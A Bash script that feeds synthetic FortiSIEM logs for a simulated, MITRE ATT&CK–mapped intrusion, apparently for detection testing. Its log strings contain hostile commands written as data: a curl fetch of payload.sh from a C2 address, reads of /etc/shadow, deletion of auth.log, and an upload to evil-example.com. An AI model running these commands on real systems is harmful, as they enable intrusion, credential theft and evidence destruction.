#!/bin/bash

# ==========================================================
# APT MITRE ATT&CK SIMULADO PARA FORTISIEM 7.5
# Solo genera logs sintéticos con logger.
# No ejecuta ataques reales.
# ==========================================================

FORTISIEM="10.255.9.3"
PORT="514"

# Entidades simuladas
FGT_HOST="FGT-LAB-EDGE"
FPX_HOST="FPX-LAB-PROXY"
LINUX_HOST="linux-web01"

ATTACKER_IP="18.231.88.45"
C2_IP="4.83.120.10"
DNS_IP="8.8.8.8"

LINUX_TARGET="20.0.10.20"
WINDOWS_TARGET="20.0.10.30"
INTERNAL_ATTACKER="20.0.10.20"

USER="j.paco"
DOMAIN_USER="age.local\\j.paco"

send_log() {
    local TAG="$1"
    local MSG="$2"

    logger -n "$FORTISIEM" -P "$PORT" -d -t "$TAG" "$MSG"
    echo "[+] $TAG -> $MSG"
    sleep 1
}

forti_date() {
    date '+%Y-%m-%d'
}

forti_time() {
    date '+%H:%M:%S'
}

epoch_ns() {
    echo "$(date +%s)000000000"
}

# ==========================================================
# 1. RECONNAISSANCE
# MITRE: TA0043 / T1595 - Active Scanning
# Fuente: FortiGate
# ==========================================================

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" vd=\"root\" srcip=$ATTACKER_IP srcport=50101 srcintf=\"wan1\" srcintfrole=\"wan\" dstip=$LINUX_TARGET dstport=22 dstintf=\"lan\" dstintfrole=\"lan\" srccountry=\"Reserved\" dstcountry=\"Reserved\" sessionid=100001 proto=6 action=\"deny\" policyid=10 policytype=\"policy\" service=\"SSH\" trandisp=\"noop\" sentbyte=0 rcvdbyte=0 sentpkt=1 rcvdpkt=0 appcat=\"unscanned\" msg=\"APT-MITRE T1595 External SSH scan denied\""

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" vd=\"root\" srcip=$ATTACKER_IP srcport=50102 srcintf=\"wan1\" srcintfrole=\"wan\" dstip=$WINDOWS_TARGET dstport=445 dstintf=\"lan\" dstintfrole=\"lan\" srccountry=\"Reserved\" dstcountry=\"Reserved\" sessionid=100002 proto=6 action=\"deny\" policyid=10 policytype=\"policy\" service=\"SMB\" trandisp=\"noop\" sentbyte=0 rcvdbyte=0 sentpkt=1 rcvdpkt=0 appcat=\"unscanned\" msg=\"APT-MITRE T1595 External SMB probe denied\""

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" vd=\"root\" srcip=$ATTACKER_IP srcport=50103 srcintf=\"wan1\" srcintfrole=\"wan\" dstip=$WINDOWS_TARGET dstport=3389 dstintf=\"lan\" dstintfrole=\"lan\" srccountry=\"Reserved\" dstcountry=\"Reserved\" sessionid=100003 proto=6 action=\"deny\" policyid=10 policytype=\"policy\" service=\"RDP\" trandisp=\"noop\" sentbyte=0 rcvdbyte=0 sentpkt=1 rcvdpkt=0 appcat=\"unscanned\" msg=\"APT-MITRE T1595 External RDP scan denied\""


# ==========================================================
# 2. INITIAL ACCESS
# MITRE: TA0001 / T1110 - Brute Force
# Fuente: Linux SSH
# ==========================================================

for i in {1..12}; do
    PORT_SRC=$((51000+i))
    send_log "$LINUX_HOST" "sshd[$((2200+i))]: Failed password for invalid user admin from $ATTACKER_IP port $PORT_SRC ssh2"
done

send_log "$LINUX_HOST" "sshd[2301]: Accepted password for $USER from $ATTACKER_IP port 51122 ssh2"


# ==========================================================
# 3. PRIVILEGE ESCALATION
# MITRE: TA0004 / T1548 - Abuse Elevation Control Mechanism
# Fuente: Linux sudo
# ==========================================================

send_log "$LINUX_HOST" "sudo: $USER : TTY=pts/0 ; PWD=/home/$USER ; USER=root ; COMMAND=/bin/bash"

send_log "$LINUX_HOST" "sudo: $USER : TTY=pts/0 ; PWD=/home/$USER ; USER=root ; COMMAND=/usr/bin/id"


# ==========================================================
# 4. EXECUTION
# MITRE: TA0002 / T1059 - Command and Scripting Interpreter
# Fuente: Linux audit/syslog
# ==========================================================

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).123:5001): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"curl http://$C2_IP/payload.sh -o /tmp/.sysupdate\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"bash\" exe=\"/bin/bash\" key=\"exec\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).124:5002): argc=2 a0=\"/bin/chmod\" a1=\"+x /tmp/.sysupdate\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"chmod\" exe=\"/bin/chmod\" key=\"exec\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).125:5003): argc=2 a0=\"/tmp/.sysupdate\" a1=\"--silent\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\".sysupdate\" exe=\"/tmp/.sysupdate\" key=\"exec\" user=\"$USER\""


# ==========================================================
# 5. PERSISTENCE
# MITRE: TA0003 / T1053 - Scheduled Task/Job
# MITRE: TA0003 / T1543 - Create or Modify System Process
# Fuente: cron/systemd
# ==========================================================

send_log "$LINUX_HOST" "CRON[2401]: (root) CMD (/tmp/.sysupdate --beacon)"

send_log "$LINUX_HOST" "systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/sysupdate.service → /etc/systemd/system/sysupdate.service."

send_log "$LINUX_HOST" "systemd[1]: Started sysupdate.service."


# ==========================================================
# 6. DEFENSE EVASION
# MITRE: TA0005 / T1070 - Indicator Removal
# Fuente: Linux audit/syslog
# ==========================================================

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).126:5004): argc=2 a0=\"/usr/bin/history\" a1=\"-c\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"history\" exe=\"/usr/bin/history\" key=\"exec\" user=\"$USER\""

send_log "$LINUX_HOST" "sudo: $USER : TTY=pts/0 ; PWD=/home/$USER ; USER=root ; COMMAND=/usr/bin/rm -f /var/log/auth.log"

send_log "$LINUX_HOST" "audit: type=PATH msg=audit($(date +%s).127:5005): item=0 name=\"/var/log/auth.log\" inode=12345 dev=08:01 mode=0100640 ouid=0 ogid=4 rdev=00:00 nametype=DELETE"


# ==========================================================
# 7. CREDENTIAL ACCESS
# MITRE: TA0006 / T1003 - OS Credential Dumping
# Fuente: Linux audit/syslog
# Log sintético, no ejecuta nada real
# ==========================================================

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).128:5006): argc=2 a0=\"/bin/cat\" a1=\"/etc/shadow\" auid=1001 uid=0 gid=0 euid=0 tty=pts0 ses=1 comm=\"cat\" exe=\"/bin/cat\" key=\"cred_access\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).129:5007): argc=2 a0=\"/usr/bin/strings\" a1=\"/etc/security/opasswd\" auid=1001 uid=0 gid=0 euid=0 tty=pts0 ses=1 comm=\"strings\" exe=\"/usr/bin/strings\" key=\"cred_access\" user=\"$USER\""


# ==========================================================
# 8. DISCOVERY
# MITRE: TA0007 / T1087 - Account Discovery
# MITRE: TA0007 / T1046 - Network Service Discovery
# Fuente: Linux audit/syslog
# ==========================================================

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).130:5008): argc=1 a0=\"whoami\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"whoami\" exe=\"/usr/bin/whoami\" key=\"discovery\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).131:5009): argc=1 a0=\"id\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"id\" exe=\"/usr/bin/id\" key=\"discovery\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).132:5010): argc=2 a0=\"ip\" a1=\"addr\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"ip\" exe=\"/usr/sbin/ip\" key=\"discovery\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).133:5011): argc=3 a0=\"nmap\" a1=\"-sS\" a2=\"10.0.10.0/24\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"nmap\" exe=\"/usr/bin/nmap\" key=\"discovery\" user=\"$USER\""


# ==========================================================
# 9. LATERAL MOVEMENT
# MITRE: TA0008 / T1021.002 - SMB/Windows Admin Shares
# MITRE: TA0008 / T1021.001 - RDP
# Fuente: FortiGate
# ==========================================================

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" vd=\"root\" srcip=$INTERNAL_ATTACKER srcport=53321 srcintf=\"lan\" srcintfrole=\"lan\" dstip=$WINDOWS_TARGET dstport=445 dstintf=\"lan\" dstintfrole=\"lan\" srccountry=\"Reserved\" dstcountry=\"Reserved\" sessionid=200001 proto=6 action=\"accept\" policyid=20 policytype=\"policy\" service=\"SMB\" trandisp=\"noop\" sentbyte=20480 rcvdbyte=10240 sentpkt=90 rcvdpkt=70 appcat=\"unscanned\" msg=\"APT-MITRE T1021.002 Internal SMB lateral movement\""

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" vd=\"root\" srcip=$INTERNAL_ATTACKER srcport=53322 srcintf=\"lan\" srcintfrole=\"lan\" dstip=$WINDOWS_TARGET dstport=3389 dstintf=\"lan\" dstintfrole=\"lan\" srccountry=\"Reserved\" dstcountry=\"Reserved\" sessionid=200002 proto=6 action=\"accept\" policyid=20 policytype=\"policy\" service=\"RDP\" trandisp=\"noop\" sentbyte=30000 rcvdbyte=22000 sentpkt=110 rcvdpkt=98 appcat=\"unscanned\" msg=\"APT-MITRE T1021.001 Internal RDP lateral movement\""


# ==========================================================
# 10. COLLECTION
# MITRE: TA0009 / T1005 - Data from Local System
# Fuente: Linux audit/syslog
# ==========================================================

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).134:5012): argc=4 a0=\"tar\" a1=\"-czf\" a2=\"/tmp/finance_backup.tar.gz\" a3=\"/srv/finance\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"tar\" exe=\"/bin/tar\" key=\"collection\" user=\"$USER\""

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).135:5013): argc=4 a0=\"find\" a1=\"/home\" a2=\"-name\" a3=\"*.xlsx\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"find\" exe=\"/usr/bin/find\" key=\"collection\" user=\"$USER\""


# ==========================================================
# 11. COMMAND AND CONTROL
# MITRE: TA0011 / T1071.001 - Web Protocols
# Fuente: FortiProxy
# ==========================================================

for i in {1..8}; do
    send_log "$FPX_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FPX_HOST\" devid=\"FPXVM0000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0317013312\" type=\"utm\" subtype=\"webfilter\" eventtype=\"ftgd_blk\" level=\"warning\" vd=\"root\" policyid=30 sessionid=$((300000+i)) user=\"$USER\" srcip=$WINDOWS_TARGET srcport=$((54000+i)) dstip=$C2_IP dstport=80 proto=6 service=\"HTTP\" hostname=\"update-checkin-cdn.evil-example.com\" profile=\"default\" action=\"passthrough\" reqtype=\"direct\" url=\"http://update-checkin-cdn.evil-example.com/checkin?id=$i\" sentbyte=350 rcvdbyte=1200 direction=\"outgoing\" msg=\"APT-MITRE T1071.001 Periodic C2 beacon\""
done

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"1501054802\" type=\"utm\" subtype=\"dns\" eventtype=\"dns-query\" level=\"notice\" vd=\"root\" srcip=$WINDOWS_TARGET srcport=55123 dstip=$DNS_IP dstport=53 proto=17 action=\"pass\" qname=\"update-checkin-cdn.evil-example.com\" qtype=\"A\" qtypeval=1 qclass=\"IN\" msg=\"APT-MITRE T1071 DNS query for C2 domain\""

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"1501054802\" type=\"utm\" subtype=\"dns\" eventtype=\"dns-query\" level=\"notice\" vd=\"root\" srcip=$WINDOWS_TARGET srcport=55124 dstip=$DNS_IP dstport=53 proto=17 action=\"pass\" qname=\"d3f9a1b2c7.evil-example.com\" qtype=\"A\" qtypeval=1 qclass=\"IN\" msg=\"APT-MITRE T1071 Suspicious random-looking DNS query\""


# ==========================================================
# 12. EXFILTRATION
# MITRE: TA0010 / T1041 - Exfiltration Over C2 Channel
# Fuente: FortiProxy + FortiGate
# ==========================================================

send_log "$FPX_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FPX_HOST\" devid=\"FPXVM0000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0317013312\" type=\"utm\" subtype=\"webfilter\" eventtype=\"ftgd_blk\" level=\"alert\" vd=\"root\" policyid=30 sessionid=400001 user=\"$USER\" srcip=$WINDOWS_TARGET srcport=54443 dstip=$C2_IP dstport=443 proto=6 service=\"HTTPS\" hostname=\"evil-example.com\" profile=\"default\" action=\"passthrough\" reqtype=\"direct\" url=\"https://evil-example.com/upload\" sentbyte=52428800 rcvdbyte=1024 direction=\"outgoing\" msg=\"APT-MITRE T1041 Large outbound upload over HTTPS\""

send_log "$FGT_HOST" "date=$(forti_date) time=$(forti_time) devname=\"$FGT_HOST\" devid=\"FGVM000000000001\" eventtime=$(epoch_ns) tz=\"+0100\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"warning\" vd=\"root\" srcip=$WINDOWS_TARGET srcport=54443 srcintf=\"lan\" srcintfrole=\"lan\" dstip=$C2_IP dstport=443 dstintf=\"wan1\" dstintfrole=\"wan\" srccountry=\"Reserved\" dstcountry=\"Reserved\" sessionid=400002 proto=6 action=\"accept\" policyid=40 policytype=\"policy\" service=\"HTTPS\" trandisp=\"noop\" sentbyte=52428800 rcvdbyte=1024 sentpkt=35000 rcvdpkt=120 appcat=\"unscanned\" msg=\"APT-MITRE T1041 Possible data exfiltration to external C2\""


# ==========================================================
# 13. IMPACT
# MITRE: TA0040 / T1486 - Data Encrypted for Impact
# Fuente: Linux audit/syslog
# Log sintético, no cifra nada real
# ==========================================================

send_log "$LINUX_HOST" "audit: type=EXECVE msg=audit($(date +%s).136:5014): argc=3 a0=\"/usr/bin/openssl\" a1=\"enc\" a2=\"-aes-256-cbc\" auid=1001 uid=1001 gid=1001 euid=1001 tty=pts0 ses=1 comm=\"openssl\" exe=\"/usr/bin/openssl\" key=\"impact\" user=\"$USER\" msg=\"APT-MITRE T1486 Simulated file encryption activity\""

send_log "$LINUX_HOST" "kernel: audit: ransomware-like file activity detected path=/srv/finance filename=finance_backup.xlsx.encrypted user=$USER srcip=$INTERNAL_ATTACKER msg=\"APT-MITRE T1486 Simulated impact event\""


echo
echo "[+] Simulación APT MITRE finalizada."
echo "[+] Busca en FortiSIEM: APT-MITRE, $ATTACKER_IP, $C2_IP, $USER"
